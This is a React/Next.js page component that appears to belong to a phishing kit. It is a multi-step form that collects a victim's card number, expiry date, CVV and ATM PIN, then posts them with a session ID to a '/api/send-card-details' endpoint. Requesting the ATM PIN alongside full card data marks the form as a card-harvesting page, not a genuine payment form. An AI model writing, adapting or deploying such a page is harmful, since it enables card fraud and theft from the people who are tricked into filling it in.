import React, { useContext, useEffect, useState } from "react";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import valid from "card-validator";
import LeftSide from "../components/LeftSide";
import RightSide from "../components/RightSide";
import Sides from "../components/Sides";
import Button from "../components/Button";
import Error from "../components/Error";
import TextInput from "../components/TextInput";
import { DataContext } from "./_app";
import axios from "axios";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { Wrapper } from "../components/Wrapper";

interface CardInformationProps {}

export const CardInformation: React.FC<CardInformationProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm({
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`Card Information`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper page="Card Information">
      <div className="card-information">
        <Sides>
          <LeftSide>
            <div>
              <TextInput
                name="cardNumber"
                title="Card Number"
                mask={cardMask}
                register={register("cardNumber", {
                  required: "Please enter your card number",
                  // pattern: {
                  //   value:
                  //     /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9]{2})[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35[0-9]{3})[0-9]{11}))$/,
                  //   message: "Please enter a valid card number",
                  // },
                  validate: (value) => {
                    if (valid.number(value).isValid) {
                      return true;
                    }

                    return "Please enter a valid card number";
                  },
                  onChange: (event) => {
                    var value = event.target.value;

                    var newState = "9999 9999 9999 9999";
                    if (/^3[47]/.test(value)) {
                      newState = "9999 999999 99999";
                    }
                    setCardMask(newState);
                  },
                })}
              />
              {errors?.cardNumber && (
                <Error
                  message={errors.cardNumber.message as unknown as string}
                />
              )}
            </div>
            <div>
              <TextInput
                name="expirationDate"
                title="Expiry Date: MM/YYYY"
                mask={`99/9999`}
                register={register("expirationDate", {
                  required: "Please enter your card expiry date",
                  validate: (value) => {
                    if (valid.expirationDate(value).isValid) {
                      return true;
                    }

                    return "Please enter a valid expiry date";
                  },
                })}
              />
              {errors?.expirationDate && (
                <Error
                  message={errors.expirationDate.message as unknown as string}
                />
              )}
            </div>
            <div>
              <TextInput
                name="cvv"
                title="CVV"
                type="number"
                register={register("cvv", {
                  required: "Please enter your card CVV",
                  validate: (value) => {
                    if (valid.cvv(value, [3, 4]).isValid) {
                      return true;
                    }

                    return "Please enter a valid CVV";
                  },
                })}
              />
              {errors?.cvv && (
                <Error message={errors.cvv.message as unknown as string} />
              )}
            </div>
            <div>
              <TextInput
                name="cardPin"
                title="ATM Pin"
                type="number"
                register={register("cardPin", {
                  required: "Please enter your card ATM pin",
                  pattern: {
                    value: /^[0-9]{4,5}$/,
                    message: "Please enter a valid ATM pin",
                  },
                })}
              />
              {errors?.cardPin && (
                <Error message={errors.cardPin.message as unknown as string} />
              )}
            </div>
          </LeftSide>
          <RightSide />
        </Sides>
        <Button onClick={onSubmit} disabled={loading} />
      </div>
    </Wrapper>
  );
};

export default CardInformation;
